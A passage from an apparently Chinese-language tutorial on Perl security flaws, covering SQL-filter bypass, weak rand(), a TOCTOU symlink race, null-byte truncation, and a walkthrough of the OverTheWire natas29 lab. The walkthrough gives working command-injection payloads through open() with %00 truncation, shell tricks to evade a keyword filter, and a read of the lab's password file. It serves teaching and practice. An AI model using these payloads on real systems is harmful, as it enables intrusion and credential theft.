![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNOfibUPZ2UQ6nrNbMEibfzsIyMW0bOIAjbFUCBwQjmf0BpbcUj0zzqMibA/640?wx_fmt=png)

结合数组参数变量覆盖，注入`?user=testuser' or 1--+&user=6`，可以看到成功进行了 SQL 注入，绕过了 sqli\_filter 的检测过滤：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNQCL2c1ugxvIkm3ZfcyZxwC7kwxUYxXgufaKLdY7m9NeSNHv5v0p2vg/640?wx_fmt=png)

导致 sqli\_filter 被绕过的漏洞根源在于，给该函数传递的是一个数组参数，通过变量覆盖的特性将 type 变量值给覆盖为了 6，从而绕过了检测逻辑。

#### 随机数安全

Perl 中的 rand() 函数只是从标准 C 库中调用相应的 rand() 函数，而 C 库函数 rand() 是一个不安全随机函数、其生成的数字不是加密安全 的。

在 C/C++ 安全编码规范中也明确禁止使用 rand() 产生用于安全用途的伪随机数。

强伪随机数 CSPRNG（安全可靠的伪随机数生成器 (Cryptographically Secure Pseudo-Random Number Generator）的各种参考：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcN9hTgJUeqrebNBX6icicVjJTHKibhU3xuIetAxS5oSIhvpgb0K6xnSQa7g/640?wx_fmt=png)

### 条件竞争

条件竞争漏洞的根源在于两个逻辑相关的操作之间的执行存在时间差，而攻击者可以利用这个时间差来绕过某些逻辑实现攻击。

比如这段代码，先判断目标文件是否存在，如果不存在则创建并写入内容：

```
unless (-e "/tmp/a\_temporary\_file") {
  open (FH, ">/tmp/a\_temporary\_file");
}
```

在这种情况下，这个时间差是指 TOCTOU（检查时间 - 使用时间）。这里检测文件是否存在和打开写入文件两个操作之间存在一个时间差。如果攻击者利用这个时间差，在程序检测到文件不存在后就立即执行如下命令创建软链接到某个重要配置文件，如下：

```
ln -s /tmp/a\_temporary\_file /etc/an\_important\_config\_file
```

此时，程序过完这个时间差再来执行打开写入目标文件的操作时，由于目标文件已经被攻击者篡改为软链接因此会导致该重要配置文件被删除。

通常，最好的解决方法是在可能存在竞争条件的地方使用原子操作。这意味着仅使用一个系统调用即可检查文件并同时创建该文件，而不会给处理器提供机会在两者之间切换到另一个进程。

在刚刚的示例中，可以使用 sysopen() 函数并指定只写模式，而无需设置 truncate 标志来避免条件竞争的问题：

```
unless (-e "/tmp/a\_temporary\_file") {
    #open (FH, ">/tmp/a\_temporary\_file");
    sysopen (FH, "/tmp/a\_temporary\_file", O\_WRONLY);  
}
```

这样，即使文件名被篡改了，但是当打开文件进行写入时也不会杀死它。

#### 00 截断

类似 PHP，Perl 中也存在 00 截断的问题。

如下代码，假设 file 变量值 "xxx" 是外部可控的值，程序本意是想打开用户输入的值拼接上 ".txt" 后缀名的文件：

```
$file = "xxx";  
open(FILE, "$file.txt");
```

此时，如果攻击者输入`test%00`，此时由于 %00 在 URL 解码变为 0x00，其在 Perl 中代表了字符串的结束，因此 open() 函数打开的是 "test" 文件而不是 "test.txt" 文件。

当然，00 截断的特性通常是结合其他漏洞进行组合绕过利用的，具体场景具体分析。

### 0x03 Perl 漏洞实战

看个 Perl 漏洞靶场：

```
http://natas29.natas.labs.overthewire.org
username:natas29
password:airooCaiseiyee8he8xongien9euhe8b
```

访问目标站点，可以选择下拉框选项，这里点击 "perl underground" 后页面返回大量内容：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNNuBV8ezYj9rDLzEC5WvU6oGOUIXjXVIH6ILBcCialkkcov8qXAAtxqw/640?wx_fmt=png)

注意到参数名为 file，推测后台是根据传入的参数名再传递给 open() 函数来打开处理。

尝试下 open() 函数的命令注入，输入`|ls`，注意管道符在前面是有回显的：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNrt2AN4PwHFLhPrHNDeA7iagy3qrx9ibdNPgNfqVe4XWqEHo7n2cP3lPQ/640?wx_fmt=png)

风平浪静，肯定是姿势不对。推测下原因，用 open() 函数打开的文件一般是要有后缀名的，而选项中的这几个 file 参数值都是不带后缀名的，那么就应该是后台对 file 参数值和后缀名进行一个拼接操作再 open 的。如果是这样，就能利用 %00 截断来截断掉后面拼接的后缀名使 open() 函数能够正确执行注入的命令。

输入`|ls%00`：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcN3lKjt6aaWDWia0p89nFR4TNL74lDVwNTSEzC9icAr1lWEJP48FviaVW1A/640?wx_fmt=png)

没毛病，通过 %00 截断的方式命令成功执行了，页面列出了当前目录下的所有文件。

我们看下 index.pl 的源码，输入`|cat index.pl%00`：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNct7LrRWdunuQNSYot3WBE1hzYGJTDIUkubvRs5hXVlLmXdnka2pPpg/640?wx_fmt=png)

页面不太好看，直接看页面源码就得到 index.pl 的源码了：

```
#!/usr/bin/perl
use CGI qw(:standard);
print <<END;
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "airooCaiseiyee8he8xongien9euhe8b" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<style>
#content {
    width: 1000px;
}
pre{
    background-color: #000000;
    color: #00FF00;
}
</style>
<h1>natas29</h1>
<div>
END
#
# morla /10111
# '$\_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever
# created insomnihack2016/fridginator, where i stole the idea from.
# that was a fun challenge, Thanks!
#
print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\\\/\\\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>
<form action="index.pl" method="GET">
<select >
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>
END
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($\_);
        }
        print "</pre>";
    }
}
print <<END;
<div>c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END
```

从源码看到，关键的漏洞点就是`open(FD, "$f.txt");`，这里直接将外部输入的 file 参数和后缀名 ".txt" 拼接后直接放进 open() 函数中执行，导致了命令注入漏洞的存在。  

靶场的要求是获得下一关即第 30 关的密码，这里看源码发现检测 file 参数值是否存在 "natas"，因此需要结合一些 shell 技巧来绕过这个检测，可以输入如下一些命令绕过并搜索下一关的相关文件：

```
|find / -name nat''as30%00
|find / -name nat""as30%00
|find / -name nat\`\`as30%00
|find / -name nat\\as30%00
|find / -name nat?s30%00
|find / -name nat${x}as30%00
|find / -name nat$(echo a)s30%00
|find / -name nat\`echo a\`s30%00
|find / -name n${SHELLOPTS:2:1}t${SHELLOPTS:2:1}s30%00 # failed
```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNWWRRdjUkYAN5ugdHjCic9yv9dwgaUU8Qvoe6GFHL4nGvdF6SFopQylg/640?wx_fmt=png)

最后读取该文件即可`|cat /etc/nat''as_webpass/nat''as30%00`：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNJwcQjGicOBrO2MUSrHJoOwibKTffia2w5YTUpUSWpdlUtV1XCGyOR74Gg/640?wx_fmt=png)

小结：该场景的漏洞点在于 open() 函数命令注入 +%00 截断。

### 0x04 参考

Security Issues in Perl Scripts:

> https://www.cgisecurity.com/lib/sips.html

Perl 安全:

> https://www.shellcodes.org/Perl/Perl%E5%AE%89%E5%85%A8.html

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdibpKaKQaEfQ3ibS661PDwcNYP9uNrl3EQMkzg4RZoQQkssIpRtKdyakBZXw959e8uk71KgHkyFuZw/640?wx_fmt=png)